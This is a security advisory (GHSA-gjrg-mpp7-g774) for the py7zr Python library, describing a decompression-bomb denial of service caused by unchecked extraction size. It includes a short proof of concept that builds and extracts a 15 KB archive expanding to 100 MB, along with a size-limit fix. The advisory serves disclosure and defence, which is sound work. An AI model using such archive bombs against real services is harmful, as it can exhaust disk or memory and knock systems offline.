# [M] py7zr: Decompression bomb (zip bomb) denial of service via unchecked extraction size

## Summary
Severity: Medium
Advisory: GHSA-gjrg-mpp7-g774
CVE: CVE-2026-55195
CWE: CWE-409
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-gjrg-mpp7-g774
Type: github-advisory

## Affected
- PyPI: `py7zr` — affected >=0 <1.1.3

## Details
py7zr's `Worker.decompress()` extracts archive entries without tracking total decompressed size. A crafted `.7z` file can exhaust disk or memory before the extraction completes.

Measured: 15.6 KB archive → 100 MB output (6,556:1 ratio).

**Proof of concept:**

```python
import py7zr, tempfile, os

# create bomb: compress 100MB of zeros into ~15KB
bomb_path = tempfile.mktemp(suffix='.7z')
with py7zr.SevenZipFile(bomb_path, 'w') as z:
    import io
    z.writef(io.BytesIO(b'\x00' * 100 * 1024 * 1024), 'bomb.bin')

print(f'archive size: {os.path.getsize(bomb_path):,} bytes')

# extract — no size check
with py7zr.SevenZipFile(bomb_path, 'r') as z:
    z.extractall(path=tempfile.mkdtemp())

print('extracted 100 MB from ~15 KB archive')
```

**Root cause:** `Worker.decompress()` in `py7zr/worker.py` writes decompressed data directly to disk without a running total or configurable size limit. There is no equivalent of Python's `zipfile` `max_size` parameter.

**Fix:** track cumulative decompressed bytes and raise before writing if a limit is exceeded:

```python
MAX_EXTRACT_SIZE = 2 * 1024 ** 3  # 2 GB default, configurable

total = 0
for chunk in decompressed_chunks:
    total += len(chunk)
    if total > MAX_EXTRACT_SIZE:
        raise py7zr.exceptions.DecompressionBombError(
            f'Extraction aborted: decompressed size exceeded {MAX_EXTRACT_SIZE} bytes'
        )
    outfile.write(chunk)
```

Tested on py7zr 0.22.0, Python 3.12, Ubuntu 22.04.

## References
- https://github.com/miurahr/py7zr/security/advisories/GHSA-gjrg-mpp7-g774
- https://github.com/miurahr/py7zr
- https://github.com/miurahr/py7zr/releases/tag/v1.1.3
